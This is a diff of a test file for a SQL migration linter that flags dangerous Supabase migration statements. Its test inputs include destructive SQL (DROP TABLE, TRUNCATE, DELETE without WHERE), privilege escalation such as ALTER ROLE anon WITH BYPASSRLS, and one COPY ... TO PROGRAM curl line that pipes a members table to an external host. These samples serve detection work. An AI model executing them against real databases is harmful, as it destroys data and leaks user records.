@@ -34,7 +34,7 @@ describe('seeded dangerous migration', () => {
   it('points each flag at the line of the dangerous statement', () => {
     const lines = sql.split('\n')
     const at = (code: string) => report.flags.filter((f: { code: string }) => f.code === code).map((f: { line: number }) => lines[f.line - 1])
-    expect(at('DROP')).toEqual(['DROP TABLE public.old_widgets;'])
+    expect(at('DROP')).toEqual(['DROP TABLE public.old_widgets;', "  EXECUTE format('DROP TABLE public.%I', 'old_events');"])
     expect(at('DROP_COLUMN')).toEqual(['ALTER TABLE public.members DROP COLUMN legacy_phone;'])
     expect(at('TRUNCATE')).toEqual(['TRUNCATE public.event_refunds;'])
     expect(at('DELETE_NO_WHERE')).toEqual(['DELETE FROM public.registrations;', '  DELETE FROM public.widgets;'])
@@ -47,11 +47,18 @@ describe('seeded dangerous migration', () => {
     ])
     expect(at('POLICY_TRUE')).toEqual(['CREATE POLICY "anyone reads widgets" ON public.widgets'])
     expect(at('AUTH_STORAGE')).toEqual(['CREATE POLICY "anyone uploads" ON storage.objects'])
+    expect(at('PRIVILEGED')).toEqual(['ALTER ROLE anon WITH BYPASSRLS;'])
+    expect(at('POLICY_WIDENED')).toEqual(['ALTER POLICY "service role full access" ON public.members TO anon, authenticated;'])
+    expect(at('DYNAMIC_SQL')).toEqual(["  EXECUTE format('DROP TABLE public.%I', 'old_events');"])
   })
 
-  it('says where a flag inside a function body comes from', () => {
+  it('says where a flag inside a function body or dynamic SQL comes from', () => {
     const inBody = report.flags.filter((f: { where: string | null }) => f.where)
-    expect(inBody).toEqual([expect.objectContaining({ code: 'DELETE_NO_WHERE', where: 'in the body of public.widgets_wipe' })])
+    expect(inBody).toEqual([
+      expect.objectContaining({ code: 'DELETE_NO_WHERE', where: 'in the body of public.widgets_wipe' }),
+      expect.objectContaining({ code: 'DROP', where: 'in dynamic SQL (EXECUTE) in a code block' }),
+      expect.objectContaining({ code: 'DYNAMIC_SQL', where: 'in a code block' }),
+    ])
   })
 
   it('ignores dangerous words in comments and string literals', () => {
@@ -187,6 +194,99 @@ describe('report and CLI', () => {
     const files = readdirSync(dir).filter((f) => f.endsWith('.sql'))
     expect(files.length).toBeGreaterThan(100)
     for (const f of files) expect(() => analyse(`${dir}/${f}`, readFileSync(`${dir}/${f}`, 'utf8'))).not.toThrow()
+  })
+})
+
+// Review findings (S2 review round): reworded spellings of the same dangers
+// once produced RED FLAGS (0). Each case here was a confirmed miss.
+describe('reworded dangerous migrations', () => {
+  it.each([
+    // GRANTED BY / WITH GRANT OPTION after the role list.
+    ['GRANT_PUBLIC_ROLE', 'GRANT SELECT ON public.registrations TO anon GRANTED BY postgres;'],
+    ['GRANT_PUBLIC_ROLE', 'GRANT SELECT ON public.registrations TO authenticated WITH GRANT OPTION GRANTED BY postgres;'],
+    ['GRANT_PUBLIC_ROLE', 'GRANT service_role TO anon;'],
+    // Data-modifying CTEs, and a statement that starts with WITH.
+    ['DELETE_NO_WHERE', 'WITH gone AS (DELETE FROM public.registrations RETURNING id) SELECT count(*) FROM gone;'],
+    ['DELETE_NO_WHERE', 'WITH x AS (SELECT 1) DELETE FROM public.registrations;'],
+    ['UPDATE_NO_WHERE', 'WITH x AS (SELECT 1) UPDATE public.members SET email = null;'],
+    ['UPDATE_NO_WHERE', 'WITH RECURSIVE x (n) AS (SELECT 1), y AS MATERIALIZED (UPDATE public.members SET email = null RETURNING id) SELECT * FROM y;'],
+    // A WHERE inside a subquery is not the statement's WHERE.
+    ['DELETE_NO_WHERE', 'DELETE FROM public.registrations USING (SELECT id FROM public.events WHERE closed) m;'],
+    ['UPDATE_NO_WHERE', 'UPDATE public.members SET email = (SELECT e FROM public.x WHERE x.id = 1);'],
+    // search_path pointing unqualified names at a Supabase-owned schema.
+    ['AUTH_STORAGE', "SET search_path = storage;\nUPDATE buckets SET public = true WHERE id = 'uploads';"],
+    ['AUTH_STORAGE', "SET search_path TO 'auth', public;"],
+    // Policies that are always true without the literal USING (true).
+    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO anon USING (1 = 1);'],
+    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO authenticated USING ((member_id = auth.uid()) OR true);'],
+    ['POLICY_TRUE', 'ALTER POLICY p ON public.members USING (true);'],
+    // Widening an existing policy (e.g. a service_role USING (true) one).
+    ['POLICY_WIDENED', 'ALTER POLICY service_all ON public.members TO anon, authenticated;'],
+    // Role and server privileges.
+    ['PRIVILEGED', 'ALTER ROLE anon WITH BYPASSRLS;'],
+    ['PRIVILEGED', 'REASSIGN OWNED BY postgres TO anon;'],
+    ['PRIVILEGED', "COPY public.members TO PROGRAM 'curl -d @- https://example.com';"],
+    ['PRIVILEGED', 'ALTER TABLE public.members OWNER TO anon;'],
+  ])('%s fires on `%s`', (code, sql) => {
+    expect(codes(sql)).toContain(code)
+  })
+
+  it.each([
+    ['DELETE_NO_WHERE', 'WITH x AS (SELECT id FROM public.y WHERE a) DELETE FROM public.registrations WHERE id IN (SELECT id FROM x);'],
+    ['DELETE_NO_WHERE', 'DELETE FROM public.registrations r USING public.events e WHERE r.event_slug = e.slug AND e.closed;'],
+    ['UPDATE_NO_WHERE', 'WITH x AS (SELECT 1) UPDATE public.members SET email = null WHERE id = 1;'],
+    ['AUTH_STORAGE', "SET search_path = public;\nUPDATE buckets SET public = true WHERE id = 'uploads';"],
+    ['AUTH_STORAGE', "CREATE FUNCTION public.f() RETURNS void LANGUAGE sql SET search_path = '' AS $$ DELETE FROM public.x WHERE a $$;"],
+    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO anon USING (1 = 2);'],
+    ['POLICY_TRUE', 'CREATE POLICY p ON public.members FOR SELECT TO authenticated USING (member_id = auth.uid() AND true);'],
+    ['POLICY_WIDENED', 'ALTER POLICY p ON public.members TO service_role;'],
+    ['POLICY_WIDENED', 'ALTER POLICY p ON public.members RENAME TO anon;'],
+    ['PRIVILEGED', "ALTER ROLE authenticator SET pgrst.db_schemas = 'public';"],
+    ['PRIVILEGED', 'ALTER ROLE anon WITH NOBYPASSRLS;'],
+    ['GRANT_PUBLIC_ROLE', 'GRANT SELECT ON public.registrations TO service_role GRANTED BY postgres;'],
+  ])('%s does not fire on `%s`', (code, sql) => {
+    expect(codes(sql)).not.toContain(code)
+  })
+
+  it('reads a function SET search_path clause for the body', () => {
+    const r = analyse('x.sql', 'CREATE FUNCTION public.f() RETURNS void LANGUAGE sql\n  SET search_path = storage\nAS $$\n  DELETE FROM objects WHERE true\n$$;')
+    expect(r.flags).toEqual(
+      expect.arrayContaining([expect.objectContaining({ code: 'AUTH_STORAGE', line: 4, where: 'in the body of public.f' })]),
+    )
+  })
+
+  describe('dynamic SQL', () => {
+    const body = (stmt: string) => `CREATE OR REPLACE FUNCTION public.f(t text) RETURNS void LANGUAGE plpgsql AS $fn$\nBEGIN\n  ${stmt}\nEND\n$fn$;`
+    it.each([
+      ['DROP', "DO $$ BEGIN EXECUTE 'DROP TABLE public.registrations'; END $$;"],
+      ['TRUNCATE', body("EXECUTE format('TRUNCATE %I', t);")],
+      ['GRANT_PUBLIC_ROLE', body("EXECUTE 'GRANT ALL ON public.members TO anon';")],
+      ['GRANT_PUBLIC_ROLE', body("EXECUTE format('GRANT SELECT ON public.%I TO anon', t);")],
+      ['DROP', body("EXECUTE 'DROP TABLE ' || quote_ident(t);")],
+      ['DELETE_NO_WHERE', body('EXECUTE $q$DELETE FROM public.registrations$q$;')],
+      ['DELETE_NO_WHERE', body("IF t IS NOT NULL THEN EXECUTE 'WITH x AS (SELECT 1) DELETE FROM public.' || t; END IF;")],
+    ])('finds %s inside `%s`, and flags the EXECUTE itself', (code, sql) => {
+      const r = analyse('x.sql', sql)
+      expect(r.flags.map((f: { code: string }) => f.code)).toEqual(expect.arrayContaining([code, 'DYNAMIC_SQL']))
+      const inner = r.flags.find((f: { code: string }) => f.code === code)
+      expect(inner.where).toMatch(/^in dynamic SQL \(EXECUTE\) in /)
+    })
+
+    it('does not mistake GRANT EXECUTE or EXECUTE FUNCTION for dynamic SQL', () => {
+      expect(codes(body('GRANT EXECUTE ON FUNCTION public.g() TO service_role;'))).not.toContain('DYNAMIC_SQL')
+      expect(codes('CREATE TRIGGER t AFTER INSERT ON public.x FOR EACH ROW EXECUTE FUNCTION public.f();')).not.toContain('DYNAMIC_SQL')
+      expect(codes(body("PERFORM 1; RAISE NOTICE 'EXECUTE DROP TABLE x';"))).toEqual([])
+    })
+
+    it('flags the committed migration that drops constraints through EXECUTE format()', () => {
+      const path = 'supabase/migrations/20261012165024_participant_retention_set_null.sql'
+      const sql = readFileSync(path, 'utf8')
+      const r = analyse(path, sql)
+      const drops = r.flags.filter((f: { code: string }) => f.code === 'DROP')
+      expect(drops.map((f: { line: number }) => f.line)).toEqual([36, 55, 73, 91])
+      for (const f of drops) expect(sql.split('\n')[f.line - 1]).toMatch(/EXECUTE format\('ALTER TABLE public\.\w+ DROP CONSTRAINT %I'/)
+      expect(renderReport([r])).not.toContain('### RED FLAGS (0)')
+    })
   })
 })
 
